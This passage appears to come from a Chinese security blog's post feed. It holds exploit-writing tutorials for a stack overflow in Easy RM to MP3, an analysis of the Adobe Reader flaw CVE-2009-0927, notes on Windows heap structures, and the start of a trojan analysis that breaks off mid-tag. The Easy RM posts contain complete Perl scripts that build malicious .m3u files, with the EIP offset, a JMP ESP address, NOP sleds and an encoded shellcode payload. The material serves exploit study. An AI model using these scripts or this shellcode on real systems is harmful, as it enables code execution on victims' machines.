90  CC..............000ffe58  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................000ffe68  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................0:000&gt; d000ffe78  90 90 90 90 cc 41 41 41-41 41 41 41 41 41 41 41  .....AAAAAAAAAAA000ffe88  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA000ffe98  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA000ffea8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA000ffeb8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA000ffec8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA000ffed8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA000ffee8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA</code></pre><p>接下来可以使用真正的shellcode来替换掉”0xcc”</p><pre><code>my $file= "test3.m3u";my $buffersize = 26067;my $junk= "C" x 250;my $nop = "\x90" x 50;my $shellcode = "\xdb\xc0\x31\xc9\xbf\x7c\x16\x70\xcc\xd9\x74\x24\xf4\xb1" ."\x1e\x58\x31\x78\x18\x83\xe8\xfc\x03\x78\x68\xf4\x85\x30" ."\x78\xbc\x65\xc9\x78\xb6\x23\xf5\xf3\xb4\xae\x7d\x02\xaa" ."\x3a\x32\x1c\xbf\x62\xed\x1d\x54\xd5\x66\x29\x21\xe7\x96" ."\x60\xf5\x71\xca\x06\x35\xf5\x14\xc7\x7c\xfb\x1b\x05\x6b" ."\xf0\x27\xdd\x48\xfd\x22\x38\x1b\xa2\xe8\xc3\xf7\x3b\x7a" ."\xcf\x4c\x4f\x23\xd3\x53\xa4\x57\xf7\xd8\x3b\x83\x8e\x83" ."\x1f\x57\x53\x64\x51\xa1\x33\xcd\xf5\xc6\xf5\xc1\x7e\x98" ."\xf5\xaa\xf1\x05\xa8\x26\x99\x3d\x3b\xc0\xd9\xfe\x51\x61" ."\xb6\x0e\x2f\x85\x19\x87\xb7\x78\x2f\x59\x90\x7b\xd7\x05" ."\x7f\xe8\x7b\xca"; my $restofbuffer = "A" x ($buffersize-(length($junk)+length($nop)+length($shellcode)));my $eip = pack('V',0x01b9f23a);my $preshellcode = "X" * 4;$preshellcode = $preshellcode . "\x61" x 9;$preshellcode = $preshellcode . "\xff\xe4";$preshellcode = $preshellcode . "\x90" x 3; #let's pretend this is the only space we have availablemy $garbage = "D" x 100; #let’s pretend this is the space we need to jump overmy $buffer = $junk.$nop.$shellcode.$restofbuffer;print "Size of buffer : ".length($buffer)."\n";open($FILE,"&gt;$file");print $FILE $buffer.$eip.$preshellcode.$garbage;close($FILE);</code></pre><img src="/2021/05/20/exploit%E7%BC%96%E5%86%99%E7%B3%BB%E5%88%972%EF%BC%9A%E6%A0%88%E6%BA%A2%E5%87%BA%EF%BC%8C%E8%B7%B3%E8%BD%AC%E8%87%B3shellcode/image-20210206000619469-1621477705987.png" class="" title="image-20210206000619469"><p>shellcode执行成功</p>]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> exploit编写 </tag>
            
            <tag> 溢出类型漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>exploit编写系列1:Easy RM to MP3 漏洞调试</title>
      <link href="/2021/05/20/exploit%E7%BC%96%E5%86%99%E7%B3%BB%E5%88%971-Easy-RM-to-MP3-%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95/"/>
      <url>/2021/05/20/exploit%E7%BC%96%E5%86%99%E7%B3%BB%E5%88%971-Easy-RM-to-MP3-%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h1 id="Easy-RM-to-MP3-漏洞调试"><a href="#Easy-RM-to-MP3-漏洞调试" class="headerlink" title="Easy RM to MP3 漏洞调试"></a>Easy RM to MP3 漏洞调试</h1><h3 id="0X00前言"><a href="#0X00前言" class="headerlink" title="0X00前言"></a>0X00前言</h3><p>分析这个漏洞主要是为了学习怎么通过调试并编写溢出类型漏洞的EXP</p><h3 id="0X01分析环境"><a href="#0X01分析环境" class="headerlink" title="0X01分析环境"></a>0X01分析环境</h3><table><thead><tr><th>调试环境</th><th>版本</th></tr></thead><tbody><tr><td>系统版本</td><td>XP_sp3</td></tr><tr><td>Easy RM to MP3</td><td>2.7.3.700</td></tr><tr><td>windbg</td><td>6.12</td></tr></tbody></table><span id="more"></span><h3 id="0X02漏洞描述"><a href="#0X02漏洞描述" class="headerlink" title="0X02漏洞描述"></a>0X02漏洞描述</h3><p>这个漏洞是一个典型的溢出类型漏洞，在处理字符的时候没有对长度做限制，在读取到第25000~30000个字符的时候会导致返回地址被覆盖导致溢出</p><h3 id="0X03漏洞分析"><a href="#0X03漏洞分析" class="headerlink" title="0X03漏洞分析"></a>0X03漏洞分析</h3><p>编写perl脚本生成漏洞验证文件</p><pre><code class="perl">my $file= "crash25000.m3u";my $junk = "\x41" x 25000;my $junk2 = "\x42" x 5000;open($FILE,"&gt;$file");print $FILE $junk.$junk2;close($FILE);print "m3u File Created successfully\n";</code></pre><p>打开cmd输入命令<code>windbg.exe -I</code>，将windbg设置为默认调试器。</p><p>用 Easy RM to MP3 打开perl脚本生成的”crash25000.m3u”</p><p>windbg会自动捕获异常附加调试</p><img src="/2021/05/20/exploit%E7%BC%96%E5%86%99%E7%B3%BB%E5%88%971-Easy-RM-to-MP3-%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95/image-20201210234341795.png" class="" title="image-20201210234341795"><p>可以看到 EIP 为42424242（BBBB），可以验证返回地址位于25000~30000之间。</p><p>我们下一步需要定位漏洞的具体位置：一般来说有两种方法：</p><ol><li>通过调试查看栈回溯查看堆栈的方式来确定溢出的位置。</li><li>将我们刚来写入字符“B”的位置填充为pattern字符串，观察程序崩溃时的 EIP来定位返回地址在缓冲区中的偏移。</li></ol><p>第二种方式无疑是比较简单方便的，我们就采用第二种方式来定位偏移。</p><p>​使用metasploit framework文件夹下tool文件夹中的pattern_create.rb工具来创建一个包含5000个字符的模型替换刚才的“B”字符。</p><p>kali@kali:/usr/share/metasploit-framework/tools/exploit$ ./pattern_create.rb -l 5000</p><img src="/2021/05/20/exploit%E7%BC%96%E5%86%99%E7%B3%BB%E5%88%971-Easy-RM-to-MP3-%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95/image-20201211000614971.png" class="" title="image-20201211000614971"><p>重新加载崩溃后可以看到 EIP 的值改变了</p><img src="/2021/05/20/exploit%E7%BC%96%E5%86%99%E7%B3%BB%E5%88%971-Easy-RM-to-MP3-%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95/image-20201211000800904.png" class="" title="image-20201211000800904"><p>此时 EIP = 0x366a4235（小端字节序：35 42 6a 36 = 5Bj6）</p><p>再次使用 metasploit 的工具 pattern_offset.rb 来计算偏移值：</p><p>kali@kali:/usr/share/metasploit-framework/tools/exploit$ ./pattern_offset.rb -q 5Bj6</p><img src="/2021/05/20/exploit%E7%BC%96%E5%86%99%E7%B3%BB%E5%88%971-Easy-RM-to-MP3-%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95/image-20201211004850534.png" class="" title="image-20201211004850534"><p>偏移位置 = 25000 + 1067</p><p>接下来我们可以重新设计一下payload来验证我们计算的偏移是否正确：</p><pre><code class="perl">my $file= "eipcrash.m3u";my $junk= "A" x 26067;my $eip = "BBBB";my $espdata = "C" x 1000;open($FILE,"&gt;$file");print $FILE $junk.$eip.$espdata;close($FILE);print "m3u File Created successfully\n";</code></pre><p>然后用生成的 “eipcrash.m3u”再次触发崩溃</p><img src="/2021/05/20/exploit%E7%BC%96%E5%86%99%E7%B3%BB%E5%88%971-Easy-RM-to-MP3-%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95/image-20201211005529815.png" class="" title="image-20201211005529815"><p>可以看到 EIP 已经被我们写入的四个字节的 “B”覆盖掉了，此时我们已经可以控制 EIP 了，接下来我们需要考虑一下怎么让EIP指向我们的shellcode，以及如何把shellcode放到被攻击的虚拟内存空间并让EIP指向它并执行。</p><p>现在栈视图如下：</p><img src="/2021/05/20/exploit%E7%BC%96%E5%86%99%E7%B3%BB%E5%88%971-Easy-RM-to-MP3-%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95/image-20201213165731693.png" class="" title="image-20201213165731693"><p>当函数返回时”BBBB”被放入EIP中执行，我们可以想办法让EIP指向我们存放shellcode的地址。</p><p>重新设计一下我们的shellcode：</p><ol><li>写入26067个”A”</li><li>EIP”BBBB”</li><li>用模型字符串替换刚才填入的字符”C”，确定一下ESP指向的地址是不是我们刚才填入的”C”开头第一个字符的位置（根据结果来调整我们的shellcode）。</li></ol><p>修改perl脚本：</p><pre><code class="perl">my $file= "test_1.m3u";my $junk= "A" x 26067;my $eip = "BBBB";my $espdata = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag";open($FILE,"&gt;$file");print $FILE $junk.$eip.$espdata;close($FILE);print "m3u File Created successfully\n";</code></pre><p>断下来之后可以看到ESP是从第五个字符开始的</p><img src="/2021/05/20/exploit%E7%BC%96%E5%86%99%E7%B3%BB%E5%88%971-Easy-RM-to-MP3-%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95/image-20201213190656563.png" class="" title="image-20201213190656563"><p>这样我们可以修改一下shellcode将我们的payload往后面放放</p><p>现在我们可以考虑编写真正的shellcode了：</p><ol><li>我们可以控制EIP</li><li>我们知道可以在哪里存放我们的shellcode</li><li>将EIP指向ESP即可</li></ol><p>但是有一个问题，现在地址ESP(0x000ffd38)包含了终止字符(null:00)，如果我们直接使用这个地址的话执行到这个位置会引起中断从而达不到我们想要的效果</p><p>所以，需要换一种方法来让EIP指向我们的shellcode</p><p>我们可以选择在进程空间中找到一个<em>JMP ESP的地址（地址中不含00）</em>来帮助我们将EIP指向shellcode</p><p>jmp esp 的opcode是 ffe4，我们可以在加载的DLL里面搜索这个指令：s 019e0000 l 01ead000 ff e4</p><img src="/2021/05/20/exploit%E7%BC%96%E5%86%99%E7%B3%BB%E5%88%971-Easy-RM-to-MP3-%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95/image-20201213211505350.png" class="" title="image-20201213211505350"><p>现在我们可以将EIP设置为0x01b9f23a，在进行测试一下，看看是否如我们所料能跳转进我们的shellcode中</p><pre><code class="perl">my $file= "test_2.m3u";my $junk= "A" x 26067;my $eip = pack('V',0x01b9f23a);;my $espdata = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag";open($FILE,"&gt;$file");print $FILE $junk.$eip.$espdata;close($FILE);print "m3u File Created successfully\n";</code></pre><p>果然成功如我们所料，EIP成功的断在了0x000ffd39处，说明我们找到的JMP ESP是有效的</p><img src="/2021/05/20/exploit%E7%BC%96%E5%86%99%E7%B3%BB%E5%88%971-Easy-RM-to-MP3-%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95/image-20201213213613001.png" class="" title="image-20201213213613001"><p>但是现在这个payload只是一堆字符，什么都做不了，接下来我们只需要将payload替换为真正有效的payload即可。</p><pre><code class="perl">my $file= "test4.m3u";my $junk= "A" x 26067;my $eip = pack('V',0x01b9f23a); #overwrite EIP with call espmy $prependesp = "XXXX"; #add 4 bytes so ESP points at beginning of shellcode bytesmy $shellcode = "\x90" x 25; #start shellcode with some NOPS$shellcode = $shellcode ."\xdb\xc0\x31\xc9\xbf\x7c\x16\x70\xcc\xd9\x74\x24\xf4\xb1" ."\x1e\x58\x31\x78\x18\x83\xe8\xfc\x03\x78\x68\xf4\x85\x30" ."\x78\xbc\x65\xc9\x78\xb6\x23\xf5\xf3\xb4\xae\x7d\x02\xaa" ."\x3a\x32\x1c\xbf\x62\xed\x1d\x54\xd5\x66\x29\x21\xe7\x96" ."\x60\xf5\x71\xca\x06\x35\xf5\x14\xc7\x7c\xfb\x1b\x05\x6b" ."\xf0\x27\xdd\x48\xfd\x22\x38\x1b\xa2\xe8\xc3\xf7\x3b\x7a" ."\xcf\x4c\x4f\x23\xd3\x53\xa4\x57\xf7\xd8\x3b\x83\x8e\x83" ."\x1f\x57\x53\x64\x51\xa1\x33\xcd\xf5\xc6\xf5\xc1\x7e\x98" ."\xf5\xaa\xf1\x05\xa8\x26\x99\x3d\x3b\xc0\xd9\xfe\x51\x61" ."\xb6\x0e\x2f\x85\x19\x87\xb7\x78\x2f\x59\x90\x7b\xd7\x05" ."\x7f\xe8\x7b\xca";open($FILE,"&gt;$file");print $FILE $junk.$eip.$prependesp.$shellcode;close($FILE);print "m3u File Created successfully\n";</code></pre><p>完成</p><img src="/2021/05/20/exploit%E7%BC%96%E5%86%99%E7%B3%BB%E5%88%971-Easy-RM-to-MP3-%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95/image-20201220161353741.png" class="" title="image-20201220161353741">]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> exploit编写 </tag>
            
            <tag> 溢出类型漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2009-0927:PDF中的JS</title>
      <link href="/2021/05/20/CVE-2009-0927-PDF%E4%B8%AD%E7%9A%84JS/"/>
      <url>/2021/05/20/CVE-2009-0927-PDF%E4%B8%AD%E7%9A%84JS/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00：分析环境"><a href="#0x00：分析环境" class="headerlink" title="0x00：分析环境"></a>0x00：分析环境</h2><table><thead><tr><th></th><th>使用的环境</th><th>备注</th></tr></thead><tbody><tr><td>操作系统</td><td>Windows XP SP3</td><td>Vmware 16</td></tr><tr><td>Adobe Reader版本</td><td>9.0中文版</td><td></td></tr><tr><td>动态调试</td><td>OllyDbg v2.01</td><td>用的原版的OD其它的OD可能会断不下来</td></tr><tr><td>静态调试</td><td>IDA7.0</td><td></td></tr></tbody></table><span id="more"></span><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>​首先用OD打开Adobe Reader 按F5使其正常运行（调试器需要设置步过int3中断和内存异常访问）</p><img src="/2021/05/20/CVE-2009-0927-PDF%E4%B8%AD%E7%9A%84JS/image-20201022230847400.png" class="" title="image-20201022230847400"><p>然后运行 poc.pdf ，OD会中断在0x00130000处产生内存写入异常。产生异常的原因是0x00130000这个地址已经超出了程序的内存空间范围，出现这种异常一般是复制了超长字符串导致的。</p><img src="/2021/05/20/CVE-2009-0927-PDF%E4%B8%AD%E7%9A%84JS/image-20201022231914767.png" class="" title="image-20201022231914767"><p>​可以通过查看模块(alt+E),查看模块属性发现0x130000为只读属性</p><h2 id="0x2"><a href="#0x2" class="headerlink" title="0x2"></a>0x2</h2><p>​接下来我们开始分析异常产生的具体原因，先观察一下堆栈情况，可以看到程序在0x2210fe27中调用了strncpy，问题有可能就在这个函数里面，我们可以在汇编窗口中观察一下这个函数。</p><img src="/2021/05/20/CVE-2009-0927-PDF%E4%B8%AD%E7%9A%84JS/image-20201022232324314.png" class="" title="image-20201022232324314"><p>​进入0x2210fe27之后我们可以看到0x2210FE25处 CALL EDI 调用了 strncp函数，按alt+E查看一下这个地址所在的模块用IDA打开查看一下函数结构。</p><img src="/2021/05/20/CVE-2009-0927-PDF%E4%B8%AD%E7%9A%84JS/image-20201022235538635.png" class="" title="image-20201022235538635"><p>​用IDA打开此文件找到这个函数的位置按F5查看一下伪C代码</p><img src="/2021/05/20/CVE-2009-0927-PDF%E4%B8%AD%E7%9A%84JS/image-20201023220723303.png" class="" title="image-20201023220723303"><p>​通过分析这段汇编代码发现strncpy的长度来源于字符串</p><img src="/2021/05/20/CVE-2009-0927-PDF%E4%B8%AD%E7%9A%84JS/image-20201023221046299.png" class="" title="image-20201023221046299"><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>​接下来我们重新用OD重新动态分析，首先在0x2210FDEB处下条件断点’EAX-EDI&gt;600’(这个长度一般情况下大于正常字符串的长度小于异常情况下堆利用的字符串长度)</p><img src="/2021/05/20/CVE-2009-0927-PDF%E4%B8%AD%E7%9A%84JS/image-20201023221613381.png" class="" title="image-20201023221613381"><p>​然后重新用OD加载AdobeReader，并打开POC，程序会断在我们设置的条件断点处，可以看到此时EAX-EDI=0X8005,再减一等于0X8004,并且此时EDI指向的位置存放数据为0C0C0C0C</p><img src="/2021/05/20/CVE-2009-0927-PDF%E4%B8%AD%E7%9A%84JS/image-20201023222257857.png" class="" title="image-20201023222257857"><p>继续往下调试到0x2210FE25CALL EDI 处,可以发现src指向的位置的数据为0C0C0C0C,要复制的长度为0x8004</p><img src="/2021/05/20/CVE-2009-0927-PDF%E4%B8%AD%E7%9A%84JS/image-20201023223038236.png" class="" title="image-20201023223038236"><img src="/2021/05/20/CVE-2009-0927-PDF%E4%B8%AD%E7%9A%84JS/image-20201023222829091.png" class="" title="image-20201023222829091"><p>(dest=0x12E4B0) + (N=0x8004) = 0x1364B4,这个地址大于了0x130000前面我们通过查看模块发现0x130000为只读模块,所以这里写入会产生异常,这下可以确认这里就是溢出的根源了.</p><p>正常来说这个时候程序抛出异常之后会进入异常处理函数,先查看一下异常处理链</p><img src="/2021/05/20/CVE-2009-0927-PDF%E4%B8%AD%E7%9A%84JS/image-20201023224822598.png" class="" title="image-20201023224822598"><p>调用strncpy之前0x12E6B4中存放下一个SEH记录的位置,0x12E6B8存放本次异常处理的地址</p><img src="/2021/05/20/CVE-2009-0927-PDF%E4%B8%AD%E7%9A%84JS/image-20201023225316223.png" class="" title="image-20201023225316223"><p>现在我们按F8步过执行strncpy(),发现程序产生了写入0x130000异常中断,此时我们再来查看异常处理结构的内容,如下所示之前存放下一个SEH记录位置的数据已经被0C0C0C0C覆盖掉了</p><img src="/2021/05/20/CVE-2009-0927-PDF%E4%B8%AD%E7%9A%84JS/image-20201023230030389.png" class="" title="image-20201023230030389"><img src="/2021/05/20/CVE-2009-0927-PDF%E4%B8%AD%E7%9A%84JS/image-20201023230050091.png" class="" title="image-20201023230050091"><p>然后再调用异常处理函数就会执行0C0C0C0C处的内容,可以看到全部都是NOP指令</p><img src="/2021/05/20/CVE-2009-0927-PDF%E4%B8%AD%E7%9A%84JS/image-20201023230914434.png" class="" title="image-20201023230914434"><p>根据POC的执行我们知道最后弹出了一个MessageBox,所以我们可以在MessageBoxA处下断点,然后栈回溯查看poc的代码</p><img src="/2021/05/20/CVE-2009-0927-PDF%E4%B8%AD%E7%9A%84JS/image-20201023231315257.png" class="" title="image-20201023231315257"><p>查看0x0C100008处的汇编代码,通过寻找user32找到kernel32的基址,然后通过hash值的对比来找到需要的导出函数,来实现了弹出MessageBox.</p><img src="/2021/05/20/CVE-2009-0927-PDF%E4%B8%AD%E7%9A%84JS/image-20201023233334952.png" class="" title="image-20201023233334952"><p>分析完成~</p>]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
          <category> windows逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PDF漏洞 </tag>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆结构</title>
      <link href="/2021/05/20/%E5%A0%86%E7%BB%93%E6%9E%84/"/>
      <url>/2021/05/20/%E5%A0%86%E7%BB%93%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<h1 id="堆结构"><a href="#堆结构" class="headerlink" title="堆结构"></a>堆结构</h1><h4 id="堆与栈的区别："><a href="#堆与栈的区别：" class="headerlink" title="堆与栈的区别："></a>堆与栈的区别：</h4><hr><ol><li>栈空间是在程序设计时已经规定好怎么使用，使用多少内存空间的。</li><li>堆是一种在程序运行时动态分配的内存。</li><li>堆是需要程序员自己通过malloc、new等函数自己申请的，根据程序的运行环境和申请的大小也有可能申请失败。</li><li>一般我们通过一个堆指针来使用所申请到的堆内存，进行读、写、释放等操作。</li><li>使用完成后需要把堆指针传给释放函数（free、delete）来回收这片内存，否则会造成内存泄漏。</li></ol><h4 id="堆的数据结构与管理策略"><a href="#堆的数据结构与管理策略" class="headerlink" title="堆的数据结构与管理策略"></a>堆的数据结构与管理策略</h4><span id="more"></span><hr><ul><li><p>堆块：堆区的内存按大小不同组织成堆块，以堆块为单位进行标识。一个堆块包括两个部分：块首和块身。块首是一个堆块头部的几个字节，用来标识这个堆块自身的信息，例如：大小、是否空闲；块身紧跟在块首后面，是分配给用户使用的数据区。</p></li><li><p><strong>堆管理系统所返回的指针一般指向块身的起始位置</strong></p></li><li><p>堆表：堆表一般位于堆区的起始位置，用于索引堆区中所有堆块的重要信息，堆表的数据结构决定了整个堆区的组织方式，是快速检索空闲块、保证堆分配效率的关键。现代操作系统的堆表往往不止一种数据结构。</p><img src="/2021/05/20/%E5%A0%86%E7%BB%93%E6%9E%84/image-20200920172506034.png" class="" title="image-20200920172506034"></li></ul><center> 堆的内存组织 </center><ul><li>在Windows中，占用态的堆块被使用他的程序索引，而堆表只索引所有空闲态的堆块。其中，最重要的堆表有两种：空闲双向链表Freelist（简称 空表），和快速单向链表Lookaside（简称 快表）。</li></ul><h5 id="1-空表"><a href="#1-空表" class="headerlink" title="1. 空表"></a>1. 空表</h5><p>​空闲堆块的块首中包含一对重要的指针，这对指针用于将空闲堆块组织成双向链表。按照堆块的大小不同，空表总共被分成128条。</p><p>​堆区一开始的堆表区中有一个128项的指针数组，被称做空表索引。该数组的每一项包括两个指针，用于标识一条空表。</p><p>​空表索引的第二项（free[1])标识了堆中所有大小为8字节的空闲堆块，之后每个索引项递增8个字节，<em><em>空闲堆块的大小 = 索引项（ID）</em> 8（字节）</em>*</p><p>​把空闲堆块按照大小链入不同的空表，可以方便堆管理系统高校检索指定大小的空闲堆块。空表索引的第一项比较特殊，这条双向链表链入了所有大于等于1024字节的堆块（小于512KB）。这些堆块按照大小依次排列。</p><img src="/2021/05/20/%E5%A0%86%E7%BB%93%E6%9E%84/image-20200920214021750.png" class="" title="image-20200920214021750"><center>空闲双向链表（Freelist）</center><h4 id="2-快表"><a href="#2-快表" class="headerlink" title="2. 快表"></a>2. 快表</h4><p>​快表是Windows为了加速堆块分配而采用的一种堆表。这类单向链表从来不会发生堆块合并（其中的空闲块块首被设置为占用态，用来防止对快合并）。</p><p>​快表也有128条，组织结构与空表类似，只是其中的对快按照单链表组织。快表总是被初始化为空，而且每条快表最多只有4个节点，故很快就会被填满。</p><p>​堆中的操作可以分为堆块分配、堆块释放和堆块合并三种。其中“分配”和“释放”是在程序中提交申请和执行的，而堆块合并则是由堆块管理系统自动完成的。</p><p>​<img src="/2021/05/20/%E5%A0%86%E7%BB%93%E6%9E%84/image-20200920220236046.png" class="" title="image-20200920220236046"></p><center>快速单向链表(Lookaside)</center>]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
          <category> windows逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 堆 </tag>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mm木马分析</title>
      <link href="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/"/>
      <url>/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h3 id="0x00-样本信息"><a href="#0x00-样本信息" class="headerlink" title="0x00 样本信息"></a>0x00 样本信息</h3><ul><li><p>文件名称：mm.exe</p></li><li><p>MD5：37eec1a29d316ed1e5e766b599dc32a1</p></li><li><p>SHA-1：75f098d6b3f217aba4c068b12896c332216fc6b3</p></li><li><p>Authentihash：1b17d4d13c65fed36321aec54f2dc9b214308bbc82821659f83e445b93d1962e</p></li><li><p>Imphash：9e932de2e1e9ccfc4eacc3a16a8c9ab4</p></li><li><p>文件类型：Win32 EXE</p></li><li><p>文件大小：63.08 KB</p></li><li><p>哈勃扫描结果：<a href="https://habo.qq.com/file/showdetail?pk=ADIGYV1qB2IIOls1">https://habo.qq.com/file/showdetail?pk=ADIGYV1qB2IIOls1</a></p></li></ul><h3 id="0x01-主要行为："><a href="#0x01-主要行为：" class="headerlink" title="0x01 主要行为："></a>0x01 主要行为：</h3><ol><li><p>劫持系统进程msiexec.exe创建远程线程（将url读入缓冲区修复为一个可以使用的PE文件）</p></li><li><p>修复改文件夹属性</p></li><li><p>将自身复制到系统目录下，自删除</p></li><li><p>设置注册表启动项</p></li></ol><span id="more"></span><h3 id="0x02-具体分析"><a href="#0x02-具体分析" class="headerlink" title="0x02 具体分析"></a>0x02 具体分析</h3><ul><li>获取自身文件路径<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/2a7657a1-f313-4339-b512-25abeedcfa49.png" class="" title="img"></li><li>获取系统时间<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/4ca75e30-8c86-4c5b-bd34-cb2f14dc6141.png" class="" title="img"></li><li>将自身复制到系统目录下，自删除<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/a56aedae-5d39-4f94-aa96-85aea9b4845e.png" class="" title="img"></li></ul><img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/69c17b1a-6286-4084-8eba-8972c864a46b.jpg" class="" title="img"><ul><li>进这个函数<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/eb5c6dd9-047e-4051-a943-8ab22e04b67c.png" class="" title="img"></li><li>loadlibrary加载msi.dll后动态解密出来一个jmp继续走<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/4be8d70e-a2e1-4293-abff-0a7d3cead6b2.png" class="" title="img"></li><li>拼接路径名创建文件<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/7f924d59-6b11-42db-89a5-bd28b27c2c11.png" class="" title="img"></li><li>读取完关闭文件仅需进这个新创建的局部变量执行，这块其实是要再进行解密的<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/77342a06-06a3-4be1-a320-24a82ceb0909.png" class="" title="img"></li><li>循环解密后继续跟进<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/11a167b0-ed7c-47f2-b1c3-acc3d3e3ef4b.png" class="" title="img"></li><li>继续跟进，有些时候并不能确定这些函数都是干什么的，这时候就需要一次一次的试错试出来了，不要害怕尝试<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/42be8870-593a-42b8-ba6d-b83b7d0e3222.png" class="" title="img"></li><li>内层有个函数继续跟进<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/3a9b6fbc-31ec-47f8-a2ef-d3d363126935.png" class="" title="img">-上面这一块发现是在分区段的修复一个新建的PE文件<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/1644551f-cd75-454c-8dfc-b71daa2b286f.png" class="" title="img"></li><li>继续跟进去<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/e910eeb7-d807-45a7-8717-3ddaddcb8c24.png" class="" title="img"></li><li>创建文件<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/29dec3b4-f38f-4110-8154-3472cd46d753.png" class="" title="img"></li><li>往这个地址再考一份PE文件，这个地址不固定每次重新打开都会变（总共拷贝了三份PE文件）<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/e6c03d16-0f6f-460a-a0bd-656833c19116.png" class="" title="img"></li><li>继续跟进<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/d2330a96-8bef-454f-8387-937c59e23ca3.png" class="" title="img"></li><li>继续跟进（看到可疑的都进去看一下）<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/08bdbc7b-b3e2-425e-9877-d0b4162c5e4b.png" class="" title="img"></li><li>创建url文件<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/088ce841-2af5-474a-afff-33533291d0b6.png" class="" title="img"></li><li>发现创建了这个系统进程<br><em>重要</em></li><li>接下来的操作要注入这个进程，在这里面创建线程执行<img src="/2021/05/19/mm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/e9328e0f-eb70-47e2-aa78-6f0efb7efbe3.png" class="" 